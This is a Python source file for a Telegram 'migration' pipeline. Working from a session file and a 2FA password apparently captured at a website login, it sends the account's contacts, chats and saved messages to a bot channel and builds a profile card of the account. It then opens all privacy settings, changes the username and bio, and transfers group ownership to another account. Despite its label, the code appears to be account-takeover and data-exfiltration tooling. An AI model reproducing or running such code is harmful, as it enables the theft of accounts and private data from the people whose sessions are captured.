from __future__ import annotations

import logging
import os
from typing import Any, Optional

from telethon import TelegramClient

from web.services.account_card import (
	account_tag,
	build_anketa_caption,
	build_anketa_text,
	console_log,
	find_avatar_in_folder,
	render_anketa_card,
	stats_from_dump_folder,
	write_anketa_files,
)
from web.services.export_options import ExportOptions
from web.services.export_service import AccountExporter, ClientFactory, ExportResult
from web.services.migration.bot_notifier import BotNotifier
from web.services.migration.groups_migrate import GroupsMigrateService
from web.services.migration.notify_group import NotifyGroupService
from web.services.migration.privacy import PrivacyService
from web.services.migration.profile import ProfileService
from web.services.migration.settings import MigrationSettings
from web.services.migration.state_store import state_store
from web.services.proxy import ProxySettings

_log = logging.getLogger("migration")


class MigrationPipeline:
	"""
	Идемпотентный пайплайн миграции:
	1) быстрый экспорт (контакты сразу в канал) + анкета
	2) приватность / профиль / notify-группа
	3) инвайт целевого аккаунта + передача владения + выход
	4) медиа (опционально)
	"""

	STEPS = (
		"export_text",
		"open_privacy",
		"change_profile",
		"notify_group",
		"migrate_groups",
		"export_media",
	)

	def __init__(
		self,
		settings: MigrationSettings,
		export_options: Optional[ExportOptions] = None,
	) -> None:
		self.settings = settings
		env_opts = ExportOptions.from_env()
		if not self.settings.export_media:
			env_opts.dump_photo = False
			env_opts.dump_voice = False
			env_opts.dump_video = False
		self.export_options = export_options or env_opts
		self.privacy = PrivacyService()
		self.profile = ProfileService()
		self.notify = NotifyGroupService()
		self.groups = GroupsMigrateService()
		self.bot = BotNotifier()

	async def run_session(
		self,
		session_path: str,
		proxy: Optional[ProxySettings] = None,
		cloud_password: str = "",
	) -> dict:
		console_log(
			f"session:{os.path.basename(session_path or '')}",
			f"connect… proxy={'yes' if proxy else 'no'}",
		)
		client = ClientFactory.create(session_path, proxy=proxy)
		await client.connect()
		console_log(f"session:{os.path.basename(session_path or '')}", "connected, check auth…")
		try:
			if not await client.is_user_authorized():
				raise RuntimeError("Сессия не авторизована")
			return await self.run_client(
				client,
				cloud_password=cloud_password,
				session_path=session_path,
			)
		finally:
			await client.disconnect()

	async def run_client(
		self,
		client: TelegramClient,
		cloud_password: str = "",
		session_path: Optional[str] = None,
	) -> dict:
		me = await client.get_me()
		account_key = str(me.phone or me.id)
		tag = account_tag(me.id, me.phone)
		state = await state_store.load(account_key)
		report = {"account": account_key, "steps": {}, "export_dir": None}

		password = (cloud_password or "").strip()
		if not password:
			from web.services.migration.cloud_secrets import cloud_secrets

			password = (await cloud_secrets.get(account_key) or "").strip()
		if password:
			state.meta["has_web_2fa"] = "1"
			await state_store.save(state)

		console_log(tag, f"старт миграции (@{me.username or '-'})")
		if session_path:
			console_log(tag, f"session: {os.path.basename(session_path)} (.session+tdata уходят после логина)")
		await self.bot.send_text(
			self.settings,
			f"{tag}\nСтарт миграции (@{me.username or '-'})",
		)

		# 1) Быстрый текстовый экспорт → сразу в бота по мере готовности
		if not state.is_done("export_text"):
			exporter = AccountExporter(
				ExportOptions(
					dump_photo=False,
					dump_voice=False,
					dump_video=False,
					dump_avatar=True,
					dump_saved_messages=True,
				)
			)

			async def on_part(name: str, path: Optional[str], extra: dict[str, Any]) -> None:
				await self._on_export_part(tag, account_key, name, path, extra)

			console_log(tag, "экспорт: контакты → чаты → анкета…")
			result: ExportResult = await exporter.export_from_client(client, on_part=on_part)
			folder = result.folder
			report["export_dir"] = folder
			state.meta["export_dir"] = folder

			anketa_body = build_anketa_text(me=result.me, stats=result.stats, folder=folder)
			write_anketa_files(folder, anketa_body)
			await self._send_anketa_card(
				tag=tag,
				me=result.me,
				stats=result.stats,
				folder=folder,
				avatar_path=result.avatar_path,
			)

			state.mark("export_text")
			await state_store.save(state)
			report["steps"]["export_text"] = folder
		else:
			folder = state.meta.get("export_dir") or ""
			report["export_dir"] = folder
			report["steps"]["export_text"] = "skipped"
			console_log(tag, "export_text уже был — пропуск, досылаем анкету-фото")
			await self._send_anketa_from_existing(client, me, tag, folder)

		# 2) Приватность
		if self.settings.open_privacy and not state.is_done("open_privacy"):
			console_log(tag, "открытие приватности…")
			result = await self.privacy.open_all(client)
			state.mark("open_privacy")
			await state_store.save(state)
			report["steps"]["open_privacy"] = result
			console_log(tag, "приватность: ok")
		else:
			report["steps"]["open_privacy"] = "skipped"

		# 3) Username + bio
		if self.settings.change_profile and not state.is_done("change_profile"):
			console_log(tag, "смена профиля…")
			result = await self.profile.apply(
				client,
				self.settings.target_username,
				self.settings.bio,
			)
			state.meta["username"] = str(result.get("username") or "")
			state.mark("change_profile")
			await state_store.save(state)
			report["steps"]["change_profile"] = result
			console_log(tag, f"профиль: {result}")
		else:
			report["steps"]["change_profile"] = "skipped"

		# 4) Ваша группа-маяк: join → message → leave
		notify_chat_id = None
		if self.settings.notify_group and not state.is_done("notify_group"):
			if not (self.settings.notify_group_link or "").strip():
				report["steps"]["notify_group"] = "skipped: empty notify_group_link"
				await self.bot.send_text(
					self.settings,
					f"{tag}\nnotify_group пропущен: нет ссылки на группу в настройках бота",
				)
			else:
				try:
					console_log(tag, "notify_group…")
					result = await self.notify.run(
						client,
						self.settings.notify_group_link,
						self.settings.notify_message,
					)
					notify_chat_id = result.get("chat_id")
					state.mark("notify_group")
					await state_store.save(state)
					report["steps"]["notify_group"] = result
					from landing.event_format import format_notify_group_report

					await self.bot.send_text(
						self.settings,
						f"{tag}\n{format_notify_group_report(result)}",
					)
					console_log(tag, "notify_group ok")
				except Exception as error:
					report["steps"]["notify_group"] = f"error: {error}"
					console_log(tag, f"notify_group ошибка: {error}", error=True)
					await self.bot.send_text(
						self.settings,
						f"{tag}\nnotify_group ошибка: {error}",
					)
		else:
			report["steps"]["notify_group"] = "skipped"

		# 5) Перенос групп на ваш второй аккаунт
		if self.settings.migrate_groups and not state.is_done("migrate_groups"):
			if not (self.settings.target_account or "").strip():
				report["steps"]["migrate_groups"] = "skipped: no target_account"
				await self.bot.send_text(
					self.settings,
					f"{tag}\nmigrate_groups пропущен: "
					"укажите «Целевой аккаунт» в боте (Профиль)",
				)
			else:
				skip_ids = set()
				if notify_chat_id:
					skip_ids.add(int(notify_chat_id))
				try:
					console_log(tag, "перенос групп…")
					result = await self.groups.run(
						client,
						target=self.settings.target_account,
						cloud_password=password,
						already_done=set(state.migrated_chats),
						skip_chat_ids=skip_ids,
						log_tag=tag,
					)
					state.migrated_chats = sorted(
						set(state.migrated_chats).union(result.get("done_ids", []))
					)
					state.meta.pop("has_web_2fa", None)
					ok_n = (
						int(result.get("invited") or 0)
						+ int(result.get("already_in") or 0)
						+ int(result.get("link_sent") or 0)
					)
					err_n = len(result.get("errors") or [])
					if ok_n > 0 or err_n == 0:
						state.mark("migrate_groups")
					await state_store.save(state)
					report["steps"]["migrate_groups"] = result
					if result.get("password_invalid"):
						from web.services.migration.cloud_secrets import cloud_secrets

						await cloud_secrets.delete(account_key)
						await self.bot.send_text(
							self.settings,
							f"{tag}\n2FA не подходит — сохранённый пароль сброшен. "
							"При следующем входе на сайте введите актуальный 2FA.",
						)
					from landing.event_format import (
						format_groups_migrate_report,
						shorten_group_error,
					)

					await self.bot.send_text(
						self.settings,
						f"{tag}\n"
						+ format_groups_migrate_report(result, has_2fa=bool(password)),
					)
					console_log(
						tag,
						f"группы: приглашено={result.get('invited')} "
						f"уже={result.get('already_in')} "
						f"ссылка={result.get('link_sent')} "
						f"админ={result.get('promoted')} "
						f"владение={result.get('ownership_transferred')} "
						f"пропуск={result.get('skipped')} ошибок={err_n}",
						error=err_n > 0 and ok_n == 0,
					)
					if result.get("errors"):
						short_errs = [
							shorten_group_error(item)
							for item in result["errors"][:15]
						]
						more = len(result["errors"]) - len(short_errs)
						tail = f"\n… ещё {more}" if more > 0 else ""
						await self.bot.send_text(
							self.settings,
							f"{tag}\nОшибки по чатам ({err_n}):\n"
							+ "\n".join(short_errs)
							+ tail,
						)
				except Exception as error:
					report["steps"]["migrate_groups"] = f"error: {error}"
					console_log(tag, f"migrate_groups ошибка: {error}", error=True)
					await self.bot.send_text(
						self.settings,
						f"{tag}\nmigrate_groups ошибка: {error}",
					)
		elif self.settings.migrate_groups and state.is_done("migrate_groups"):
			report["steps"]["migrate_groups"] = "skipped: already done"
			await self.bot.send_text(
				self.settings,
				f"{tag}\nmigrate_groups уже был выполнен. "
				"В боте: Действия → Сбросить шаги миграции, затем снова войдите.",
			)
		else:
			report["steps"]["migrate_groups"] = "skipped"

		# 6) Медиа в конце (медленно) — флаги из .env
		if self.settings.export_media and not state.is_done("export_media"):
			console_log(tag, "дамп медиа…")
			media_opts = ExportOptions.from_env()
			media_opts.dump_avatar = False
			media_opts.dump_saved_messages = False
			exporter = AccountExporter(media_opts)
			media_result = await exporter.export_from_client(client)
			media_folder = media_result.folder
			state.meta["media_dir"] = media_folder
			state.mark("export_media")
			await state_store.save(state)
			report["steps"]["export_media"] = media_folder
			report["export_dir"] = media_folder
			await self.bot.send_text(
				self.settings,
				f"{tag}\nМедиа сохранено: {media_folder}",
			)
			console_log(tag, f"медиа: {media_folder}")
		else:
			report["steps"]["export_media"] = "skipped"

		console_log(tag, "миграция завершена")
		await self.bot.send_text(self.settings, f"{tag}\nМиграция завершена")
		return report

	async def _send_anketa_from_existing(
		self,
		client: TelegramClient,
		me,
		tag: str,
		folder: str,
	) -> None:
		"""Даже если export_text skipped — собрать карточку из папки дампа + свежая ава."""
		from web.services.flood import call_with_flood_wait

		if not folder or not os.path.isdir(folder):
			# нет старой папки — быстрый мини-дамп только для анкеты
			stamp = __import__("datetime").datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
			phone = getattr(me, "phone", None) or str(me.id)
			folder = os.path.join("dumps", f"{phone}_{stamp}_anketa")
			os.makedirs(folder, exist_ok=True)

		stats = stats_from_dump_folder(folder)
		avatar_path = find_avatar_in_folder(folder)
		if not avatar_path:
			try:
				avatar_path = await call_with_flood_wait(
					lambda: client.download_profile_photo("me", os.path.join(folder, "ava"))
				)
				if avatar_path and os.path.isfile(avatar_path):
					stats.has_avatar = True
				else:
					avatar_path = find_avatar_in_folder(folder)
					stats.has_avatar = bool(avatar_path)
			except Exception as exc:
				console_log(tag, f"аватар для анкеты: {exc}", error=True)
		# если у аккаунта нет авы — подставится ava.jpg/png из корня в render_anketa_card
		if not avatar_path:
			from web.services.account_card import default_placeholder_avatar

			avatar_path = default_placeholder_avatar()

		stats.has_info = stats.has_info or True
		anketa_body = build_anketa_text(me=me, stats=stats, folder=folder)
		write_anketa_files(folder, anketa_body)
		await self._send_anketa_card(
			tag=tag,
			me=me,
			stats=stats,
			folder=folder,
			avatar_path=avatar_path,
		)

	async def _send_anketa_card(
		self,
		*,
		tag: str,
		me,
		stats,
		folder: str,
		avatar_path: Optional[str],
	) -> None:
		card_path = render_anketa_card(
			folder=folder,
			me=me,
			stats=stats,
			avatar_path=avatar_path,
		)
		console_log(
			tag,
			f"анкета-фото: контакты={stats.contacts} "
			f"ava={'yes' if avatar_path else 'no'} card={'yes' if card_path else 'no'}",
		)
		caption = build_anketa_caption(me=me, stats=stats, html=True)
		if card_path and os.path.isfile(card_path):
			await self.bot.send_photo(self.settings, card_path, caption=caption)
		elif avatar_path and os.path.isfile(avatar_path):
			await self.bot.send_photo(self.settings, avatar_path, caption=caption)
		else:
			await self.bot.send_text(
				self.settings,
				build_anketa_caption(me=me, stats=stats, html=False),
			)
		anketa_txt = os.path.join(folder, "anketa.txt")
		if os.path.isfile(anketa_txt):
			await self.bot.send_file(
				self.settings,
				anketa_txt,
				caption=f"{tag} · anketa.txt",
			)

	async def _on_export_part(
		self,
		tag: str,
		account_key: str,
		name: str,
		path: Optional[str],
		extra: dict[str, Any],
	) -> None:
		"""Как только часть дампа готова — в канал и в консоль."""
		labels = {
			"info": "info.txt",
			"contacts": "контакты",
			"avatar": "аватар",
			"chats": "чаты/каналы",
			"people": "people.txt",
			"csv": "people.csv",
			"saved": "избранное",
			"media_start": "медиа…",
			"media_done": "медиа готово",
		}
		label = labels.get(name, name)
		if name == "contacts":
			count = extra.get("count", 0)
			console_log(tag, f"готово: контакты ({count}) → канал")
			await self.bot.send_file(
				self.settings,
				path or "",
				caption=f"{tag} · Контакты: {count}",
			)
			return
		if name == "chats":
			console_log(
				tag,
				f"готово: чаты g={extra.get('groups')} ch={extra.get('channels')} "
				f"dlg={extra.get('dialogs')}",
			)
			await self.bot.send_file(
				self.settings,
				path or "",
				caption=(
					f"{tag} · Чаты/каналы "
					f"(группы {extra.get('groups')}, каналы {extra.get('channels')})"
				),
			)
			return
		if name in ("info", "people", "csv", "saved") and path:
			console_log(tag, f"готово: {label}")
			await self.bot.send_file(
				self.settings,
				path,
				caption=f"{tag} · {label}",
			)
			return
		if name == "avatar" and path:
			console_log(tag, "аватар скачан")
			return
		if name == "media_start":
			console_log(tag, "скачивание медиа…")
			return
		if name == "media_done":
			console_log(tag, f"медиа в {path}")
			return
		_log.debug("%s part %s %s", tag, name, path)
